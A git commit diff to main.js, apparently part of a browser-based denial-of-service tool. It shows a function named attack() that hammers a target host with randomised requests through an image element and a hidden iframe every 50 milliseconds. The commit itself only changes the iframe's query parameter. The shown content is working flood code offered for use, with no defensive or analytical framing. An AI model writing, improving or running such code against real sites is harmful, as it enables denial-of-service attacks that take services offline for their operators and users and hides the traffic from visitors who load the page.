33c4bd758085f6fcf978b09e34d32f0a0dd3f32e
ninja25538 <ninja25538@users.noreply.github.com>
2017-08-08 14:43:42 -0400

    Update main.js

--- main.js
+++ main.js
@@ -4,6 +4,6 @@ function attack() {
   var rand = Math.floor(Math.random() * 1000);
   pic.src = 'http://'+target+"/?"+rand;
     
-    document.body.innerHTML+='<iframe src="'+target+"/?"+rand+'" style="display:none;"></iframe>';
+    document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
 }
 setInterval(attack, 50);  
